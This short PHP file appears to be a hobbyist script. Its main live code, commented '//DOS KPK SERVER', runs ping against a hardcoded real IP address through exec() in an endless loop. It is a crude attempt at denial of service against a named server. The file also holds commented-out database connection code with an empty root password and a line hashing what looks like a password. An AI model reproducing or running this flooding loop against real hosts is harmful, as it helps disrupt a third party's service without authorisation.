<?php

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */


//$con = mysqli_connect("localhost:3306","root","","portfolio");
//
//// Check connection
//if (mysqli_connect_errno()) {
//  echo "Failed to connect to MySQL: " . mysqli_connect_error();
//  exit();
//} else {
//    printf("Connection Sucessful with database = ");
//    print_r($con);
//}
//printf(md5("__@@Rit3353@@__.?/\|!@#$%^&*()_+~,."));

$ip = "158.69.253.146";
//DOS KPK SERVER
while (true) {
    $host = "158.69.253.146";

    exec("ping -c 4 " . $host, $output, $result);

    print_r($output);

    if ($result == 0)
        echo "__________________________________________________________________________________________________________________________________________\n Ping successful!<br>";
    else
        echo "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nPing unsuccessful!<br>";
}
